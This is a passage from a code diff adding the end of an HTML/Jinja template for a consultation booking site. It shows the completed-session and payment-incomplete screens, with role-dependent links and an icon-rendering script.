+        <i data-lucide="check-circle" class="w-8 h-8 text-emerald-400"></i>
+      </div>
+      <h2 class="text-xl font-extrabold text-white mb-2">Consultation Concluded</h2>
+      <p class="text-xs text-slate-400 mb-6">
+        This 30-minute consultation with {{ consultant_name }} on {{ appointment_time_str }} has completed.
+      </p>
+      {% if is_consultant %}
+      <a href="/consultant/dashboard" class="inline-flex items-center justify-center gap-2 w-full py-3 rounded-xl bg-[#2d6a5a] hover:bg-[#1e4d40] text-white font-bold text-xs transition-colors shadow-sm">
+        <i data-lucide="layout-dashboard" class="w-4 h-4"></i>
+        <span>Return to Consultant Dashboard</span>
+      </a>
+      {% else %}
+      <a href="/quickconsult" class="inline-flex items-center justify-center gap-2 w-full py-3 rounded-xl bg-[#1e4d40] hover:bg-[#133930] text-white font-bold text-xs transition-colors">
+        Book Another Quick Consult
+      </a>
+      {% endif %}
+    </div>
+
+    {% else %}
+    <!-- PAYMENT PENDING / ERROR -->
+    <div class="max-w-md w-full bg-slate-900/90 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl text-center">
+      <div class="w-14 h-14 rounded-full bg-amber-500/10 text-amber-400 flex items-center justify-center mx-auto mb-4 border border-amber-500/20">
+        <i data-lucide="alert-circle" class="w-7 h-7"></i>
+      </div>
+      <h2 class="text-lg font-bold text-white mb-2">Payment Incomplete</h2>
+      <p class="text-xs text-slate-400 mb-5">{{ message | default("Please complete booking payment to access this room.") }}</p>
+      {% if is_consultant %}
+      <a href="/consultant/dashboard" class="inline-block py-2.5 px-6 rounded-xl bg-[#2d6a5a] hover:bg-[#1e4d40] text-white font-bold text-xs transition-colors shadow-sm">
+        Return to Dashboard
+      </a>
+      {% else %}
+      <a href="/quickconsult" class="inline-block py-2.5 px-6 rounded-xl bg-[#1e4d40] text-white font-bold text-xs">
+        Return to Booking
+      </a>
+      {% endif %}
+    </div>
+    {% endif %}
+
+  </main>
+
+  <script>
+    if (window.lucide) lucide.createIcons();
+  </script>
+</body>
+</html>
